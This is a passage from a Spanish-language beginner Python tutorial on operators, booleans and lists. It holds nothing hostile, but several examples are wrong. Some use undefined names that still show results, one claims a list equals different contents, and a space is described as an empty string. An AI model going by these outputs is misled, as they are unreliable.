&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;texto1 = &quot;Hola&quot;

texto2 = &quot;Python&quot;

print(texto1 + texto2)

'HolaPython'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Si queremos agregar un espacio, debemos agregar una cadena vacia &lt;code&gt;&quot; &quot;&lt;/code&gt;, sin embargo no podemos restar dichas cadenas.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(text1 + &quot; &quot; + text2)

'Hola Python'

print(texto1 - texto2)

---------------------------------------------------------------------------
TypeError                                 Traceback (most recent call last)
&amp;lt;ipython-input-16-ed11b0c86524&amp;gt; in &amp;lt;module&amp;gt;
----&amp;gt; 1 texto1 - texto2

TypeError: unsupported operand type(s) for -: 'str' and 'str'
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;multiplicación-y-división&quot;&gt;Multiplicación y División&lt;/h2&gt;

&lt;p&gt;Los operadores de multiplicacion &lt;code&gt;*&lt;/code&gt; y division &lt;code&gt;/&lt;/code&gt; son operadores binarios que pueden aplicarse sobre distintos tipos de datos.&lt;/p&gt;

&lt;h3 id=&quot;multiplicar-y-dividir-datos-numericos&quot;&gt;multiplicar y dividir datos numericos&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1 = 20

numero2 = 4

numero1 * numero2

80

# IMPORTANTE: El resultado al dividir siempre es un float

print(numero1 / numero2)

5.0
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;multiplicar-y-dividir-datos-strings&quot;&gt;multiplicar y dividir datos strings&lt;/h3&gt;

&lt;p&gt;No podemos multiplicar o dividir cadenas de texto.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;texto1 = &quot;Hola&quot;

texto2 = &quot;Python&quot;

texto1 * texto2

---------------------------------------------------------------------------
TypeError                                 Traceback (most recent call last)
&amp;lt;ipython-input-21-4d766fa04d9a&amp;gt; in &amp;lt;module&amp;gt;
----&amp;gt; 1 texto1 * texto2

TypeError: can't multiply sequence by non-int of type 'str'

print(texto1 / texto2)

---------------------------------------------------------------------------
TypeError                                 Traceback (most recent call last)
&amp;lt;ipython-input-22-7ba20b66d6c5&amp;gt; in &amp;lt;module&amp;gt;
----&amp;gt; 1 texto1 / texto2

TypeError: unsupported operand type(s) for /: 'str' and 'str'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pero si podemos multiplicar una cadena de texto por un numero entero, que imprime el numero de veces de la cadena segun el que numero por el que multiplicamos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;texto1 * 3

'HolaHolaHola'
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;modulo&quot;&gt;Modulo&lt;/h2&gt;

&lt;p&gt;El operador modulo &lt;code&gt;%&lt;/code&gt; es un operador binario que devuelve el resto de una división entre tipos de datos numericos ya sean enteros o flotantes.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1 = 10

numero2 = 7

print(numero1 % numero2)

3

print(numero2 % numero1)

7

numero1 = 10.5

numero2 = 7.2

print(numero1 % numero2)

3.3
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;exponencial&quot;&gt;Exponencial&lt;/h2&gt;

&lt;p&gt;El operador exponencial &lt;code&gt;**&lt;/code&gt; es un operador binario que se aplica solo en tipos de datos numéricos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1 = 5

numero1 ** 2

25

numero ** 3

125

texto1 = &quot;Hola Python&quot;

texto1 ** 2

---------------------------------------------------------------------------
TypeError                                 Traceback (most recent call last)
&amp;lt;ipython-input-33-a3cd4ee7680f&amp;gt; in &amp;lt;module&amp;gt;
----&amp;gt; 1 texto1 ** 2

TypeError: unsupported operand type(s) for ** or pow(): 'str' and 'int'
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;division-entera&quot;&gt;Division Entera&lt;/h2&gt;

&lt;p&gt;El operador divison entera &lt;code&gt;//&lt;/code&gt;es un operador binario que se aplica sobre tipos de datos numéricos y devuelve la parte entera del resultado.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1 = 10

numero2 = 7

print(numero1 / numero2)

1.4285714285714286

print(numero1 // numero2)

1
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;operadores-de-asignación&quot;&gt;Operadores de Asignación &lt;a href=&quot;#operadores-de-asignación&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Anteriormente ya hemos usado el operador de asignación &lt;code&gt;=&lt;/code&gt; para asignar un valor a una variable.&lt;/p&gt;

&lt;p&gt;Sin embargo Python3 nos proporciona un mecanismo para combinar operadores aritméticos y operadores de asignación simplificando nuestro codigo. Esa combinación se denomina &lt;code&gt;Augmented Assignment&lt;/code&gt;.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Operador&lt;/th&gt;
      &lt;th&gt; &lt;/th&gt;
      &lt;th&gt;Significado&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;a += 4&lt;/td&gt;
      &lt;td&gt;es igual a&lt;/td&gt;
      &lt;td&gt;a = a + 4&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;a -= 8&lt;/td&gt;
      &lt;td&gt;es igual a&lt;/td&gt;
      &lt;td&gt;a = a - 8&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;a *= 10&lt;/td&gt;
      &lt;td&gt;es igual a&lt;/td&gt;
      &lt;td&gt;a = a * 10&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;a /= 5&lt;/td&gt;
      &lt;td&gt;es igual a&lt;/td&gt;
      &lt;td&gt;a = a / 5&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Veamos unos ejemplos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero = 15

numero += 5

print(numero)

20

numero2 = 20

numero2 *= 2

print(numero2)

40

numero3 = 8

numero3 -= 3

print(numero3)

5
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&quot;booleanos&quot;&gt;Booleanos &lt;a href=&quot;#booleanos&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Los tipos de datos Boolenos en Python se representan con el tipo &lt;code&gt;bool&lt;/code&gt; y reciben únicamente dos posibles valores:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;True&lt;/li&gt;
  &lt;li&gt;Fase&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable = True

print(variable)

True
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos usar la funcion reservada &lt;code&gt;type&lt;/code&gt; para ver el tipo de variable&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable = True

type(varaible)

bool

variable2 = False

type(variable2)

bool
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una cosa a tener en cuenta es que las palabras &lt;code&gt;True&lt;/code&gt; y &lt;code&gt;False&lt;/code&gt; son palabras reservadas dentro de Python3 y no se les puede asignar ningún valor.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;True = &quot;Hola Python&quot;

  File &quot;&amp;lt;ipython-input-7-31dbcec71c48&amp;gt;&quot;, line 1
    True = &quot;Hola Python&quot;
    ^
SyntaxError: cannot assign to True
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;operadores-de-comparación&quot;&gt;Operadores de Comparación &lt;a href=&quot;#operadores-de-comparación&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Son los que evalúan la relación que existe entre dos valores en Python. Existen diferentes tipos:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Operador&lt;/th&gt;
      &lt;th&gt;Ejemplo&lt;/th&gt;
      &lt;th&gt;Significado&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;==&lt;/td&gt;
      &lt;td&gt;a == b&lt;/td&gt;
      &lt;td&gt;Igual a&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;!=&lt;/td&gt;
      &lt;td&gt;a != b&lt;/td&gt;
      &lt;td&gt;No igual a&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&amp;lt;&lt;/td&gt;
      &lt;td&gt;a &amp;lt; b&lt;/td&gt;
      &lt;td&gt;Menor que&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&amp;lt;=&lt;/td&gt;
      &lt;td&gt;a &amp;lt;= b&lt;/td&gt;
      &lt;td&gt;Menor que o igual a&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&amp;gt;&lt;/td&gt;
      &lt;td&gt;a &amp;gt; b&lt;/td&gt;
      &lt;td&gt;Mayor que&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&amp;gt;=&lt;/td&gt;
      &lt;td&gt;a &amp;gt;= b&lt;/td&gt;
      &lt;td&gt;Mayor que o igual a&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;comparación-entre-datos-numericos&quot;&gt;Comparación entre datos numericos&lt;/h3&gt;

&lt;p&gt;A continacion veremos algunos ejemplos&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1 = 4

numero2 = 8

numero1 == 4

True

numero1 == numero2

False

numero1 == 4.0

True

numero1 != 4

False

numero1 != numero2

True
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Otros ejemplos&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1 = 10

numero2 = 15

numero1 &amp;lt; numero2

True

numero2 &amp;lt; numero1

False

numero1 &amp;lt;= 10.0

True
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;comparación-entre-datos-strings&quot;&gt;Comparación entre datos strings&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;texto1 = &quot;cadena de texto&quot;

texto2 = &quot;cadena de texto 2&quot;

texto1 == &quot;cadena de texto&quot;

True

text1 == text2

False

text1 != text2

True
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora veamos un tipo de comparación mas inusual&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;texto1 = &quot;Cadena de mi texto&quot;

texto2 = &quot;texto&quot;

texto1 &amp;lt; texto2

True
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos ver algo muy extraño&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Esta comparación utiliza un orden lexicográfico: primero se comparan los dos primeros elementos, y si estos son diferentes, determina el resultado de la comparación; si son iguales, se comparan los dos siguientes elementos, y así sucesivamente, hasta que se agote cualquiera de las dos secuencias.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;y ahora se preguntaran si segun el principio tenemos arriba como primer caracter de &lt;code&gt;texto1 -&amp;gt; C&lt;/code&gt; y de &lt;code&gt;texto2 -&amp;gt; t&lt;/code&gt; como entonces lo esta haciendo?&lt;/p&gt;

&lt;p&gt;Pues esto es por la sencilla razon de que esta comparacion lo realiza utilizando los equivalentes numericos de cada caracter, esto mediante la funcion reservada &lt;code&gt;ord()&lt;/code&gt;que recibe un caracter y se encarga de transformar un caracter a codigo unicode.&lt;/p&gt;

&lt;p&gt;Veamoslo mejor con el ejemplo anterior:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#texto1 = &quot;Cadena de mi texto&quot;
#texto2 = &quot;texto&quot;
#condicion texto1 &amp;lt; texto2

&quot;Cadena de mi texto&quot; &amp;lt; &quot;texto&quot;

True

#Cojemos los primeros caracteres de ambas variables y les aplicamos la funcion ord()

ord('C')

67

ord('t')

116

#tendriamos que C = 67 y t = 116

67 &amp;lt; 116

True
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Despues de analizar el ejemplo anterior, efectivamente vemos que la condicion era cierta y ahora nos queda claro como es que funciona.&lt;/p&gt;

&lt;h1 id=&quot;operadores-de-identidad&quot;&gt;Operadores de Identidad &lt;a href=&quot;#operadores-de-identidad&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Los operadores de identidad se utilizan para comparar objetos. Sin embargo, no comparan si los objetos son iguales, en su lugar, comparan si son el mismo objeto:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Operador&lt;/th&gt;
      &lt;th&gt;Ejemplo&lt;/th&gt;
      &lt;th&gt;Significado&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;is&lt;/td&gt;
      &lt;td&gt;x is y&lt;/td&gt;
      &lt;td&gt;Devuelve &lt;code&gt;True&lt;/code&gt; si las dos variables son el mismo objeto&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;is not&lt;/td&gt;
      &lt;td&gt;x is not y&lt;/td&gt;
      &lt;td&gt;Devuelve `True si las dos variables no son el mismo objeto&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Veamoslo mejor en un caso practico:&lt;/p&gt;

&lt;p&gt;tenemos dos variables:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;texto1 = &quot;Hola Python&quot;

text2 = &quot;Hola Python&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que ambas variables tienen el mismo valor, pero si aplicamos la funcion reservada &lt;code&gt;id()&lt;/code&gt;  en cada variable nos da un valor diferente.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;id(texto1)

140608469061488

id(texto2)

140608469060976
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Te preguntaras a que corresponde el valor que nos muestra despues de aplicar la funcion; pues el resultado viene a ser el valor de la porcion de memoria que se le asigna a esa variable en ese preciso momento, ya que si volvemos a crear la misma variable con el mismo valor de nuevo nos mostrara un valor diferente.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;
texto1 = &quot;Hola Python&quot;

id(texto1)

140608469400944
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora aplicaremos la comparacion de indentidad a nuestras dos variables previamente creadas:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;
texto1 is texto2

False

texto1 == texto2

True
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;En el resultado podemos apreciar que &lt;code&gt;is&lt;/code&gt; nos devuelve &lt;code&gt;False&lt;/code&gt; a diferencia de cuando aplicamos &lt;code&gt;==&lt;/code&gt; que nos devuelve &lt;code&gt;True&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;Esto se debe a que &lt;code&gt;==&lt;/code&gt; solo nos compara que las variables contengan el mismo valor, pero el &lt;code&gt;is&lt;/code&gt; nos compara que ambas variables sean el mismo objeto creado en la misma porcion de memoria en otras palabras si tienen el mismo identificador que nos mostraba la funcion &lt;code&gt;id()&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Como en el caso siguente que crearemos una nueva variable &lt;code&gt;texto3&lt;/code&gt; y la igualaremos a la anterior variable que creamos &lt;code&gt;texto1&lt;/code&gt;, en este caso la variable &lt;code&gt;texto3&lt;/code&gt; heredara todo de la variable &lt;code&gt;texto1&lt;/code&gt; esto incluye la porcion de memoria en la que se creo.&lt;/p&gt;

&lt;p&gt;Por lo tanto a la hora de ejecutar nuevamente el operador de identidad &lt;code&gt;is&lt;/code&gt; esta vez nos dara el valor de &lt;code&gt;True&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;texto3 = texto1

texto3 is texto1

True
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;operadores-de-pertenencia&quot;&gt;Operadores de Pertenencia &lt;a href=&quot;#operadores-de-pertenencia&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Los operadores de pertenencia se utilizan para evaluar sin una secuencia se encuentra presente en un objeto.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Operador&lt;/th&gt;
      &lt;th&gt;Ejemplo&lt;/th&gt;
      &lt;th&gt;Significado&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;in&lt;/td&gt;
      &lt;td&gt;x in y&lt;/td&gt;
      &lt;td&gt;Devuelve &lt;code&gt;True&lt;/code&gt; si la secuencia x se encuntra presente en y, de lo contrario devuelve &lt;code&gt;False&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;not in&lt;/td&gt;
      &lt;td&gt;x not in y&lt;/td&gt;
      &lt;td&gt;Devuelve &lt;code&gt;True&lt;/code&gt; si la secuencia x no se encuentra en y, de lo contrario devuelve &lt;code&gt;False&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Veamoslo en un ejemplo:&lt;/p&gt;

&lt;p&gt;Obervamos que si la secuencia en este caso &lt;code&gt;cadena&lt;/code&gt; esta presente en la variable &lt;code&gt;texto&lt;/code&gt;, esto nos responde &lt;code&gt;True&lt;/code&gt; ya que solo debe incluirse para que se cumpla esta condicion.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;texto = &quot;Mi cadena de texto&quot;

&quot;cadena&quot; in texto

True

&quot;hola&quot; in texto

False

&quot;e&quot; in text

True
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pero si intentamos hacer el mismo proceso en un numero entero, recibimos un error ya que el operador &lt;code&gt;in&lt;/code&gt; solo sirve para secuencias que son iterables&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;num = 1345678

1 in numero
---------------------------------------------------------------------------
TypeError                                 Traceback (most recent call last)
&amp;lt;ipython-input-7-882699b1f88c&amp;gt; in &amp;lt;module&amp;gt;
----&amp;gt; 1 1 in numero

TypeError: argument of type 'int' is not iterable
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;operadores-logicos&quot;&gt;Operadores Logicos &lt;a href=&quot;#operadores-logicos&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Los operadores lógicos modifican y unen expresiones evaluadas en contexto booleano para crear condiciones más complejas.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Operador&lt;/th&gt;
      &lt;th&gt;Ejemplo&lt;/th&gt;
      &lt;th&gt;Significado&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;not&lt;/td&gt;
      &lt;td&gt;not x&lt;/td&gt;
      &lt;td&gt;Devuelve &lt;code&gt;True&lt;/code&gt; si x el &lt;code&gt;False&lt;/code&gt;, de lo contrario devuelve &lt;code&gt;True&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;or&lt;/td&gt;
      &lt;td&gt;x or y&lt;/td&gt;
      &lt;td&gt;Devuelve &lt;code&gt;True&lt;/code&gt; si x o y son &lt;code&gt;True&lt;/code&gt;, de lo contrario devuelve &lt;code&gt;False&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;and&lt;/td&gt;
      &lt;td&gt;x and y&lt;/td&gt;
      &lt;td&gt;Devuelve &lt;code&gt;True&lt;/code&gt; si ambos x como y son &lt;code&gt;True&lt;/code&gt;, de lo contrario devuelve &lt;code&gt;False&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;operador-not&quot;&gt;Operador not&lt;/h3&gt;

&lt;p&gt;Evaluamos la expresion y con &lt;code&gt;not&lt;/code&gt; invierte el valor que nos devuelve una expresion&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero = 10

numero &amp;lt; 20

True

not numero &amp;lt; 20

False
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;operador-or&quot;&gt;Operador or&lt;/h3&gt;

&lt;p&gt;Observamos que el resultado nos devuelve &lt;code&gt;True&lt;/code&gt;, puesto que si bien la primera condicion es &lt;code&gt;False&lt;/code&gt;, con el uso del operador &lt;code&gt;or&lt;/code&gt; solo necesita devolver una de ellas &lt;code&gt;True&lt;/code&gt;, concretamente ya que la segunda condicion si se cumplia.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1 = 10

numero2 = 20

numero1 &amp;lt; 5

False

numero1 &amp;lt; 5 or numero2 &amp;gt; 10

True
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;operador-and&quot;&gt;Operador and&lt;/h3&gt;

&lt;p&gt;El operador &lt;code&gt;and&lt;/code&gt; si requiere que se cumpla la evaluacion de todas las expresiones para que devuelva un valor &lt;code&gt;True&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1 = 5

numero2 = 10

numero1 &amp;lt; 8 and numero2 &amp;gt; 15

False

numero1 &amp;lt; 10 and numero2 &amp;gt; 7

True
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;listas&quot;&gt;Listas &lt;a href=&quot;#listas&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Las listas son un tipo de dato complejo y particular en &lt;code&gt;Python3&lt;/code&gt;. Una lista se corresponde con una colección arbitraria de objetos. Las listas son similares a estructuras conocidas como arrays en otros lenguajes de programación pero con la diferencia de que en &lt;code&gt;Python3&lt;/code&gt; aportan mas flexibilidad.&lt;/p&gt;

&lt;p&gt;En Python3 se representan con el tipo &lt;code&gt;list&lt;/code&gt; y la sintaxis que se utiliza para definirlas consiste en indicar una lista de objetos separados entre comas y encerrados entre corchetes: [objeto1, objeto2, …, objeton]&lt;/p&gt;

&lt;p&gt;Veamoslo de manera practica&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Podemos una lista con datos numericos.&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = [1, 2, 3, 4, 5]

type(lista)

list

print(lista)

[1, 2, 3, 4, 5]
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;Tambien crear una lista con tipo de datos string&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista2 = [&quot;texto1&quot;, &quot;texto2&quot;, &quot;texto3&quot;]

type(lista2)

list

print(lista2)

['texto1', 'texto2', 'texto3']
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que tenemos una lista igual a la anterior pero con la diferencia que esta contiene cadenas de texto.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;El orden en el que se especifican los elementos cuando se define una lista es relevante y se mantiene durante toda su vida.&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = ['n1', 'n2', 'n3']

print(lista)

['n1', 'n2', 'n3']
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;Podemos comparar las listas con los operadores mencionados anteriormente.&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista1 = ['n1', 'n2', 'n3']

lista2 = ['n2', 'n1', 'n3']

lista1 == lista2

False

'n1' in lista2

True

lista1 in lista2

False

lista1 == ['t1', 't2', 't3']

True

lista1 is lista2

False
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;Las lista pueden contener distintos tipos de datos.&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = [1, 2, &quot;hola&quot;, &quot;python&quot;]

print(lista)

[1, 2, 'hola', 'python']
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;Una cosa super interesante es que una lista puede contener una &lt;code&gt;función&lt;/code&gt; estas las veremos mas adelante pero es importante mantenerlo presente&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def funcion():
    print(&quot;Hola python&quot;)

lista = [&quot;texto1&quot;, &quot;texto2&quot;, funcion]

print(lista)

['texto1', 'texto2', &amp;lt;function funcion at 0x0000012D476D0EE0&amp;gt;]
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;acceso-a-elementos-de-una-lista&quot;&gt;Acceso a elementos de una lista&lt;/h2&gt;

&lt;p&gt;Todas las variaciones vistas en la sección de strings (indexing, slicing, stride) aplican a las listas.&lt;/p&gt;

&lt;h3 id=&quot;indexing&quot;&gt;indexing&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = [&quot;texto1&quot;, &quot;texto2&quot;, &quot;texto3&quot;, &quot;texto4&quot;, &quot;texto5&quot;]

lista[0]

'texto1'

lista[-1]

'texto5'
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;slicing-1&quot;&gt;slicing&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = [&quot;texto1&quot;, &quot;texto2&quot;, &quot;texto3&quot;, &quot;texto4&quot;, &quot;texto5&quot;]

lista[2:4]

['texto3', 'texto4']

lista[:3]

['texto1', 'texto2', 'texto3']

lista[2:]

['texto3', 'texto4', 'texto5']
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;stride-1&quot;&gt;stride&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = [&quot;texto1&quot;, &quot;texto2&quot;, &quot;texto3&quot;, &quot;texto4&quot;, &quot;texto5&quot;]

lista[0:4:2]

['texto1', 'texto3'
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;otra cosa interesante es que podemos utilizar el concepto de &lt;code&gt;stride&lt;/code&gt; para darle la vuelta a una &lt;code&gt;lista&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista

['texto1', 'texto2', 'texto3', 'texto4', 'texto5']

lista[::-1]

['texto5', 'texto4', 'texto3', 'texto2', 'texto1']
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;Una de las pocas construcciones sintácticas en cuanto a la &lt;code&gt;indexación&lt;/code&gt; que cambia entre los &lt;code&gt;strings&lt;/code&gt; y las &lt;code&gt;listas&lt;/code&gt; es &lt;code&gt;[:]&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;Cuando lo usamos nos devuelve una referencia al propio objeto&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;texto = &quot;Hola python&quot;

texto[:]

'Hola python'

texto[:] is texto

True
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
  &lt;li&gt;Al utilizarlo con una &lt;code&gt;lista&lt;/code&gt; nos devuelve una copia del objetivo -&amp;gt; ojo no el mismo.&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = [1, 2, 3, 4]

lista[:]

[1, 2, 3, 4]

lista[:] is lista

False
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;operaciones-con-listas&quot;&gt;Operaciones con listas&lt;/h2&gt;

&lt;p&gt;Las listas soportan muchos de los operadores y funciones de Python como los que vimos anteriormente.&lt;/p&gt;

&lt;p&gt;Al sumar las listas estas se anidan&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista1 = [1, 2, 3]

lista2 = [4, 5, 6]

lista1 + lista2

[1, 2, 3, 4, 5, 6]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Cuando usamos el operador de multiplicación, esto hace que se multipliquen sus mismos valores segun el numero por el cual se le multiplique.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista1 = [1, 2, 3]

lista1 * 2

[1, 2, 3, 1, 2, 3]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tambien podemos ver la longitud, el valor &lt;code&gt;minimo&lt;/code&gt; y el &lt;code&gt;maximo&lt;/code&gt; de una lista&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista1 = [1, 2, 3]

lista2 = [4, 5, 6]

len(lista1)

3

min(lista1)

1

max(lista2)

6
&lt;/code&gt;&lt;/pre&gt;

